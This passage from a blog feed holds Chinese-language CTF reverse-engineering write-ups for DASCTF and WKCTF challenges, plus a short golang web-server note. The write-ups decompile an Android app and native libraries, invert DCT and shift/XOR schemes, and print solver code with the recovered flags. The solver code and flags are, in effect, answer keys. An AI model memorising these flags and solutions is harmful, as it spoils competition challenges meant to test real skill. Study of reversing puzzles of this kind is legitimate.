class="number">0x09101112</span>, <span class="number">0x13141516</span>, <span class="number">0x15161718</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt; <span class="number">0</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">last[i] ^= last[<span class="number">0</span>];</span><br><span class="line">last[i + <span class="number">1</span>] ^= last[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br><span class="line"># DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyAndroid">BabyAndroid</h2><p>这个题如果没有套娃，我愿夸它，但是出题人知不知道我以为我要解完了结果才是刚刚开始有多么崩溃</p><p>首先题目给了抓包信息</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">charset</span><span class="punctuation">: </span>utf-8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Dalvik/2.1.0 (Linux; U; Android 11; M2004J7AC Build/RP1A.200720.011)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>413</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">data</span>=TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+<span class="number">6</span>uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/<span class="number">5</span>uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==</span></span><br></pre></td></tr></table></figure><p>很明显data就是flag，然后要逆程序</p><p>jadx（原谅我安卓只会jadxQAQ）搜索yuanshen.com找到发送位置</p><p><img src="https://s2.loli.net/2024/07/21/mR4YMlZDWVLO7py.png" alt="image-20240721175844067"></p><p>然后它用反射调用了encrypt方法，没有搜索到，同时也没看到site.qifen.note.ui.Encrypto，然后详细看这段代码，发现它加载了sex.jpg然后解密作为dex，那么查看解密方法，解密dex，发现是rc4，直接复制为文本解密</p><p>然后看加密方式</p><p><img src="https://s2.loli.net/2024/07/22/giLMsU5YJQGAEWk.png" alt="image-20240721180421330"></p><p>得到密钥：0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D</p><p>解密数据得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">458</span>.<span class="number">853181</span>,-<span class="number">18</span>.<span class="number">325492</span>,-<span class="number">18</span>.<span class="number">251911</span>,-<span class="number">2</span>.<span class="number">097520</span>,-<span class="number">21</span>.<span class="number">198660</span>,-<span class="number">22</span>.<span class="number">304648</span>,<span class="number">21</span>.<span class="number">103162</span>,-<span class="number">5</span>.<span class="number">786284</span>,-<span class="number">15</span>.<span class="number">248906</span>,<span class="number">15</span>.<span class="number">329286</span>,<span class="number">16</span>.<span class="number">919499</span>,-<span class="number">19</span>.<span class="number">669045</span>,<span class="number">30</span>.<span class="number">928253</span>,-<span class="number">37</span>.<span class="number">588034</span>,-<span class="number">16</span>.<span class="number">593954</span>,-<span class="number">5</span>.<span class="number">505211</span>,<span class="number">3</span>.<span class="number">014744</span>,<span class="number">6</span>.<span class="number">553616</span>,<span class="number">31</span>.<span class="number">131491</span>,<span class="number">16</span>.<span class="number">472500</span>,<span class="number">6</span>.<span class="number">802400</span>,-<span class="number">78</span>.<span class="number">278577</span>,<span class="number">15</span>.<span class="number">280099</span>,<span class="number">3</span>.<span class="number">893073</span>,<span class="number">56</span>.<span class="number">493581</span>,-<span class="number">34</span>.<span class="number">576344</span>,<span class="number">30</span>.<span class="number">146729</span>,<span class="number">4</span>.<span class="number">445671</span>,<span class="number">6</span>.<span class="number">732204</span></span><br></pre></td></tr></table></figure><p>？？？什么玩意</p><p>然后再一看数据传入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cipher</span> <span class="operator">=</span> (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]), NoteActivity.<span class="built_in">this</span>.sendInit(contentText));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还有一个sendInit</p><p>一看是个native，apktool解包，ida开</p><p><img src="https://s2.loli.net/2024/07/22/VmuI7E9RPlWzAGN.png" alt="image-20240721181218663"></p><p>可以找到encrypt函数</p><p>这里复制下来网上搜索可以查到，这个算法是DCT2，一维的，搜索可以看到：</p><p><a href="https://zh.wikipedia.org/wiki/%E7%A6%BB%E6%95%A3%E4%BD%99%E5%BC%A6%E5%8F%98%E6%8D%A2">离散余弦变换</a></p><p>但是DCT3并不可以直接逆向DCT2，查了很多资料也没查到</p><p>然后就看着佬的wp复现了</p><p>逆向时，把DCT3的$x_0/2$去掉，然后后面处理相同，</p><p>同时对每个值乘以$\sqrt{\frac{2}{N}}$和$\sqrt{\frac{1}{N}}$也是在DCT2同样的位置处理，代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dct3</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">double</span>&gt;&amp; Y, std::vector&lt;<span class="type">double</span>&gt;&amp; X)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> N = Y.<span class="built_in">size</span>();</span><br><span class="line">X.<span class="built_in">resize</span>(N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; N; ++n) &#123;</span><br><span class="line"><span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; ++k) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">1.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">2.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">X[n] = sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; res = &#123; <span class="number">458.853181</span>,<span class="number">-18.325492</span>,<span class="number">-18.251911</span>,<span class="number">-2.097520</span>,<span class="number">-21.198660</span>,<span class="number">-22.304648</span>,<span class="number">21.103162</span>,<span class="number">-5.786284</span>,</span><br><span class="line"><span class="number">-15.248906</span>,<span class="number">15.329286</span>,<span class="number">16.919499</span>,<span class="number">-19.669045</span>,<span class="number">30.928253</span>,<span class="number">-37.588034</span>,<span class="number">-16.593954</span>,<span class="number">-5.505211</span>,</span><br><span class="line"><span class="number">3.014744</span>,<span class="number">6.553616</span>,<span class="number">31.131491</span>,<span class="number">16.472500</span>,<span class="number">6.802400</span>,<span class="number">-78.278577</span>,<span class="number">15.280099</span>,<span class="number">3.893073</span>,</span><br><span class="line"><span class="number">56.493581</span>,<span class="number">-34.576344</span>,<span class="number">30.146729</span>,<span class="number">4.445671</span>,<span class="number">6.732204</span> &#125;;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; X;</span><br><span class="line"><span class="built_in">dct3</span>(res, X);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">double</span> x : X) &#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> chr = (<span class="type">char</span>)std::<span class="built_in">round</span>(X[i]);</span><br><span class="line">std::cout &lt;&lt; chr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DASCTF&#123;Y0u_Ar3Re4lly_H@ck3r!&#125;</span></span><br></pre></td></tr></table></figure><hr><p>补充DCT变换公式（一维）：</p><p><img src="https://s2.loli.net/2024/07/22/VjwTGsU8gbd9Mqr.png" alt="image-20240722132702606"></p><p>逆变换</p><p><img src="https://s2.loli.net/2024/07/22/iSNuvny7QTjHwcE.png" alt="image-20240722132724585"></p><p>就按上面写的那样写就好了</p>]]></content>
    
    
    <summary type="html">打比赛(划掉)被比赛打</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
    <category term="汇编" scheme="https://www.pri87.vip/tags/%E6%B1%87%E7%BC%96/"/>
    
    <category term="调试" scheme="https://www.pri87.vip/tags/%E8%B0%83%E8%AF%95/"/>
    
    <category term="套娃" scheme="https://www.pri87.vip/tags/%E5%A5%97%E5%A8%83/"/>
    
  </entry>
  
  <entry>
    <title>golang学习</title>
    <link href="https://www.pri87.vip/posts/484c947.html"/>
    <id>https://www.pri87.vip/posts/484c947.html</id>
    <published>2024-07-16T07:24:17.000Z</published>
    <updated>2024-07-16T07:28:04.533Z</updated>
    
    <content type="html"><![CDATA[<p>有点想学开发，这里先开一篇，之后补充</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi I love %s!&quot;</span>, r.URL.Path[<span class="number">1</span>:])</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个基本的网页</p><p>基本语法：</p><p><a href="https://www.runoob.com/go/go-tutorial.html">Go 语言教程 | 菜鸟教程 (runoob.com)</a></p>]]></content>
    
    
    <summary type="html">golang</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>WKCTF-RE部分wp</title>
    <link href="https://www.pri87.vip/posts/4f799b15.html"/>
    <id>https://www.pri87.vip/posts/4f799b15.html</id>
    <published>2024-07-16T01:08:28.000Z</published>
    <updated>2024-07-17T04:54:23.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="very-easy-该题未做出">very_easy[该题未做出]</h2><p>根据<a href="https://blog.csdn.net/Pisces50002/article/details/139580346">矩阵杯2024 Re wp 前两题-CSDN博客</a>这篇博客，遇到类似的题需要下载quickJS后在linux系统上make编译，并以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;quickjs-libc.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> qjsc_size = <span class="number">3881</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> qjsc[<span class="number">3884</span>] = &#123;</span><br><span class="line">   the_data</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  JSRuntime *rt;</span><br><span class="line">  JSContext *ctx;</span><br><span class="line">  rt = JS_NewRuntime();</span><br><span class="line">  ctx = JS_NewContextRaw(rt);</span><br><span class="line">  JS_SetModuleLoaderFunc(rt, <span class="literal">NULL</span>, js_module_loader, <span class="literal">NULL</span>);</span><br><span class="line">  JS_AddIntrinsicBaseObjects(ctx);</span><br><span class="line">  JS_AddIntrinsicDate(ctx);</span><br><span class="line">  JS_AddIntrinsicEval(ctx);</span><br><span class="line">  JS_AddIntrinsicStringNormalize(ctx);</span><br><span class="line">  JS_AddIntrinsicRegExp(ctx);</span><br><span class="line">  JS_AddIntrinsicJSON(ctx);</span><br><span class="line">  JS_AddIntrinsicProxy(ctx);</span><br><span class="line">  JS_AddIntrinsicMapSet(ctx);</span><br><span class="line">  JS_AddIntrinsicTypedArrays(ctx);</span><br><span class="line">  JS_AddIntrinsicPromise(ctx);</span><br><span class="line">  JS_AddIntrinsicBigInt(ctx);</span><br><span class="line">  js_std_add_helpers(ctx, argc, argv);</span><br><span class="line">  js_std_eval_binary(ctx, qjsc, qjsc_size, <span class="number">0</span>);</span><br><span class="line">  js_std_loop(ctx);</span><br><span class="line">  JS_FreeContext(ctx);</span><br><span class="line">  JS_FreeRuntime(rt);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我编译后报错version 2 expected 67. 然后就放弃了</p><h2 id="so-easy">so_easy</h2><p>一个so的算法逆向</p><p>遇到so可以用多种架构的都看一下，防止某一个反编译出来比较奇怪。</p><p>逻辑大致是这样：</p><p><img src="https://s2.loli.net/2024/07/16/8F51fyzBTO4QNlK.png" alt="image-20240716091801464"></p><p>这种每个都要循环255次的，爆破怕是不现实，所以一定要找到两种操作对结果的不同影响。</p><p>可以发现：</p><p>input最高位为0时（input为正数），仅左移一位，最后0位为0<br>input最高位为1时（input为负数），左移再异或，最后0位为1</p><p>根据这一点来判断大小然后写算法逆向</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dec</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mask = <span class="number">1LL</span> &lt;&lt; <span class="number">63</span>;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &amp; <span class="number">1</span>) &#123;</span><br><span class="line">last ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>) | mask;</span><br><span class="line">check++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">encode</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &gt;= <span class="number">0</span>)</span><br><span class="line">last &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">last = (last &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x71234EA7D92996F5</span>LL;</span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> enc[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x540A95F0C1BA81AE</span>, <span class="number">0xF8844E52E24A0314</span>, <span class="number">0x09FD988F98143EC9</span>, <span class="number">0x3FC00F01B405AD5E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] = <span class="built_in">dec</span>(enc[i]);</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; enc[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)enc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// WKCTF&#123;2366064af80f669c2cb9519ab&#125;</span></span><br></pre></td></tr></table></figure><h2 id="quite-easy">quite_easy</h2><p>这个题最后连蒙带猜出来了QAQ</p><p>它hook了strcmp函数，在里面做加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *(<span class="type">char</span> *)get_byte(j);</span><br><span class="line">  v5 = *(<span class="type">char</span> *)get_byte(j + <span class="number">32</span>) ^ v4;</span><br><span class="line">  v6 = *(_BYTE *)get_byte(j);</span><br><span class="line">  v7 = (_BYTE *)get_byte(j + <span class="number">32</span>);</span><br><span class="line">  sub_4C13E3(~(*v7 &amp; v6) &amp; v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">16</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = *(<span class="type">char</span> *)get_byte(k);</span><br><span class="line">  v9 = *(<span class="type">char</span> *)get_byte(k - <span class="number">16</span>) ^ v8;</span><br><span class="line">  v10 = *(_BYTE *)get_byte(k);</span><br><span class="line">  v11 = (_BYTE *)get_byte(k - <span class="number">16</span>);</span><br><span class="line">  sub_4C13E3(~(*v11 &amp; v10) &amp; v9);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = (_BYTE *)get_byte(m);</span><br><span class="line">  *v14 -= *(_BYTE *)(m + a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密大概有这三个，sub_4C13E3专门用来放置内容到output</p><p>前面几个才是加密，这个加密方式当时是猜的，有点抽象，调不动，复现的时候验证了一下发现确实就是它写的那样加密的</p><p>由于调试时可以发现，它把随机生成的16位值拼在flag后面了，所以可以调试得到第一轮的参数，第二轮的参数就是flag的值，然后最后一轮用了传入的第二个字符串，就是那个假flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x6F</span>, <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0x8C</span>, <span class="number">0xB4</span>, <span class="number">0x5B</span>, <span class="number">0x96</span>, <span class="number">0xC0</span>, <span class="number">0x59</span>, <span class="number">0xAC</span>, <span class="number">0x18</span>, <span class="number">0xDF</span>, <span class="number">0x2D</span>, <span class="number">0xCE</span>, <span class="number">0x3F</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xED</span>, <span class="number">0xD8</span>, <span class="number">0xD2</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0xF8</span>, <span class="number">0x23</span>, <span class="number">0x9F</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>]</span><br><span class="line"></span><br><span class="line">mask = [<span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x64</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x7D</span>]</span><br><span class="line">rand = [<span class="number">0xB1</span>, <span class="number">0x74</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0xD6</span>, <span class="number">0x13</span>, <span class="number">0xCC</span>, <span class="number">0x85</span>, <span class="number">0x20</span>, <span class="number">0xA8</span>, <span class="number">0xF4</span>, <span class="number">0x96</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x7D</span>, <span class="number">0x26</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    last[i]+=mask[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    last[i]^=rand[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">32</span>):</span><br><span class="line">    last[i]^=last[i-<span class="number">16</span>]</span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># WKCTF&#123;08898c40064d1fc4836db94fe&#125;</span></span><br></pre></td></tr></table></figure><p>这里应当先执行第一个解密再执行第二个解密，这样第二轮解密才能用当时异或的值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;very-easy-该题未做出&quot;&gt;very_easy[该题未做出]&lt;/h2&gt;
&lt;p&gt;根据&lt;a href=&quot;https://blog.csdn.net/Pisces50002/article/details/139580346&quot;&gt;矩阵杯2024 Re wp 前两题-</summary>
      
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>git基本操作</title>
    <link href="https://www.pri87.vip/posts/ab9e1965.html"/>
    <id>https://www.pri87.vip/posts/ab9e1965.html</id>
    <published>2024-07-16T01:04:14.000Z</published>
    <updated>2024-07-16T01:36:23.957Z</updated>
    
